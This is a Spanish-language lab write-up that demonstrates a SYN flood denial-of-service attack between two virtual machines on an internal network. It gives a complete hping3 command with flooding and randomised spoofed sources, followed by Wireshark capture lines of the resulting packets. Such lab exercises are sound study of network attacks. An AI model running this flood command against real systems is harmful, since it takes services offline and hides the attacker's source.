Este laboratorio cuenta con dos máquina virtuales:
- Windows 10 con configuración de la red: red interna. IP 10.10.10.5
- Ubuntu 23.10 con configuración de la red: red interna. IP: 10.10.10.3

Comprobamos que las máquina virtuales se vean haciendo un ping:
![](capturas/ping.png)
![](capturas/ping.win.png)


En la máquina Windows:
- No hace falta desactivar el antivirus de Windows. Funciona igualmente.
- Abrimor Wireshark  para snifar el tráfico.

En la máquina Linux instalamos hping3 y lanzamos el ataque:
```
sudo apt-get install hping3
sudo hping3 -c 15000 -d 120 -S -w 64 -p 80 --flood --rand-source 10.10.10.5
```
![](capturas/Dos-1.png)


Comprobamos en Wireshark el ataque:
![](capturas/wireshark-Dos-Attack.png)

```
117	53.374939	113.237.38.92	10.10.10.5	TCP	174	1528 → 80 [SYN] Seq=0 Win=64 Len=120 [TCP segment of a reassembled PDU]
118	53.374939	72.210.92.205	10.10.10.5	TCP	174	1529 → 80 [SYN] Seq=0 Win=64 Len=120 [TCP segment of a reassembled PDU]
119	53.374939	44.242.130.118	10.10.10.5	TCP	174	1530 → 80 [SYN] Seq=0 Win=64 Len=120 [TCP segment of a reassembled PDU]
120	53.374939	33.240.239.31	10.10.10.5	TCP	174	1531 → 80 [SYN] Seq=0 Win=64 Len=120 [TCP segment of a reassembled PDU]
121	53.374939	203.148.209.97	10.10.10.5	TCP	174	1532 → 80 [SYN] Seq=0 Win=64 Len=120 [TCP segment of a reassembled PDU]
```
